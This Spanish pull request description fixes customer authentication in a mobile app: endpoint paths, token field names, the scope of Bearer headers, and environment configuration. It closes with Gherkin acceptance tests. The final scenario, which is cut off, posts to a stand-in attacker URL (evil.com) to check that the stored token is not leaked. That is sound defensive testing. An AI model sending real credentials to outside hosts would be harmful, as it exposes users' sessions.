## Contexto

Auditoría externa (otra IA) revisó el código merged en `developer` (M1.1, M1.2, M1.3) y reportó 7 issues. Tres de ellas son bloqueantes para F2+ y comparten archivos, así que se agrupan en este PR único:

- **#51 CRÍTICO** — AuthService usa contratos equivocados:
  - Endpoints `/auth/login|register|me|logout` apuntan al namespace admin (no `/auth/customer/...`).
  - Backend devuelve `accessToken` (camelCase); mobile lee `access_token` (snake_case).
  - `me()` backend devuelve `{ user: {...} }`; mobile espera `CustomerUser` directo.
  - `refresh()` mobile llama `/auth/refresh` que **no existe** en backend.
  - `CustomerUser` mobile omite `role` y declara campos que backend no emite (`email_verified_at`, `created_at`, `updated_at`).
- **#52 ALTA** — Bearer leaks en endpoints públicos: regex `PUBLIC_PATH_PATTERNS` exige `/api/` prefix pero AuthService pasa paths sin `/api/`. Tests pasan porque usan paths con `/api/` (irreales).
- **#54 ALTA** — Env config rota para device/EAS: `getApiBaseUrl()` hardcodea `localhost:8000`, no hay variable `EXPO_PUBLIC_API_BASE_URL`, no hay bloque `extra` en `app.json`, no hay `env` por profile en `eas.json`, Android emulator sin `10.0.2.2`. Release builds caen silenciosamente a localhost si falta `EXPO_PUBLIC_ENV=production`.

## Problema

**El flujo de auth nunca ha funcionado contra el backend real** — cualquier `authService.login()` contra producción fallaría con 422 ("Admin access required.") porque apunta al endpoint admin, no customer. El mock en tests oculta el problema.

Además:
- Login con credenciales válidas manda Bearer header (token leak) porque regex no matchea paths reales.
- Release EAS build apunta a `localhost:8000` aunque el device no pueda resolverlo.
- Android emulator no llega al backend (necesita `10.0.2.2`).

## Objetivo

1. AuthService apunta a `/api/auth/customer/{login,register,logout,me}`.
2. `AuthSession`/`CustomerUser` reflejan el shape real del backend (`accessToken`, `role`, sin campos no emitidos).
3. `refresh()` se elimina (Sanctum no tiene refresh; rotación = re-login).
4. `me()` unwrapea `{ user }` → `user`.
5. Bearer header NO se manda en `/api/auth/customer/login` y `/api/auth/customer/register` (logout y me sí llevan Bearer).
6. URLs absolutas externas se rechazan (defensa en profundidad).
7. `getApiBaseUrl()` lee `EXPO_PUBLIC_API_BASE_URL` (env principal); tiene defaults explícitos para sim/emulator/device; throw explícito si release build no tiene la env var.
8. `app.json` añade bloque `extra`; `eas.json` define env por profile; nuevo `.env.example` documenta variables esperadas.
9. Tests existentes se actualizan al nuevo shape; tests nuevos cubren bearer scope real y e2e (si backend disponible).

## Contratos

### Endpoints (mobile → backend)

| Operación | Path completo | Method | Auth | Backend |
|---|---|---|---|---|
| Login | `<base>/auth/customer/login` | POST | NO | `CustomerAuthController::login` |
| Register | `<base>/auth/customer/register` | POST | NO | `CustomerAuthController::register` |
| Logout | `<base>/auth/customer/logout` | POST | SÍ | `CustomerAuthController::logout` |
| Me | `<base>/auth/customer/me` | GET | SÍ | `CustomerAuthController::me` |

### AuthSession shape (alineado con backend)

```ts
type AuthSession = {
  accessToken: string;       // camelCase, snake_case eliminado
  user: CustomerUser;
  expires_at?: string;       // opcional, futuro
};

type CustomerUser = {
  id: number;
  name: string;
  email: string;
  phone: string | null;
  role: string;              // 'customer'|'admin'|etc — backend lo emite
  // email_verified_at, created_at, updated_at eliminados
};
```

### Bearer injection scope

- `PUBLIC_PATH_PATTERNS`: `[/^\/api\/auth\/customer\/(login|register)$/]`
- Paths absolutos externos: **NO Bearer**.

### Env vars

- `EXPO_PUBLIC_API_BASE_URL` (default: dev nativo iOS sim `http://localhost:8000/api`, Android emu `http://10.0.2.2:8000/api`, web `http://localhost:8080/api`; obligatorio en release).
- `EXPO_PUBLIC_ENV` (`development` | `preview` | `production`).
- `EXPO_PUBLIC_API_TIMEOUT_MS` (default dev 15000, prod 30000).

## Acceptance Criteria (BDD)

### AC1: AuthService apunta a paths customer

```gherkin
Scenario: Login apunta a /auth/customer/login
  Given httpClient.post mockeado
  When usuario llama authService.login("a@x.com", "pwd")
  Then httpClient.post fue llamado con path "/auth/customer/login" (sin /api/)
  And httpClient.post fue llamado con body { email, password, device_name: "mobile-app" }
```

### AC2: AuthSession usa accessToken camelCase

```gherkin
Scenario: Login guarda accessToken
  Given httpClient.post mockeado retorna { accessToken: "tok-abc", user: {...} }
  When authService.login("a@x.com", "pwd")
  Then el token guardado en SecureStore es "tok-abc"
  And useAuthStore().token === "tok-abc"
```

### AC3: me() unwrapea { user } → user

```gherkin
Scenario: me() devuelve CustomerUser directo
  Given httpClient.get mockeado retorna { user: { id: 1, name: "Ana", email: "a@x.com", role: "customer", phone: null } }
  When authService.me()
  Then retorna { id: 1, name: "Ana", email: "a@x.com", role: "customer", phone: null } (NO envuelto)
```

### AC4: refresh() eliminado

```gherkin
Scenario: refresh no existe
  Then authService.refresh no es una función
  And ENDPOINTS.refresh es undefined o no existe en ENDPOINTS
```

### AC5: Bearer NO se manda en login

```gherkin
Scenario: Login sin Bearer
  Given SecureStore tiene token "stale-tok"
  When authService.login("a@x.com", "pwd")
  Then httpClient.post fue llamado con path "/auth/customer/login"
  And el header Authorization NO está presente (o no contiene "stale-tok")
```

### AC6: Bearer SÍ se manda en logout/me

```gherkin
Scenario: Logout con Bearer
  Given SecureStore tiene token "fresh-tok"
  When authService.logout()
  Then httpClient.post fue llamado con header "Authorization: Bearer fresh-tok"
```

### AC7: URL absoluta externa → sin Bearer

```gherkin
Scenario: URL externa maliciosa
  Given SecureStore tiene token "leak-candidate"
  When httpClient.post("https://evil.com/api/auth/customer/me", {})
```
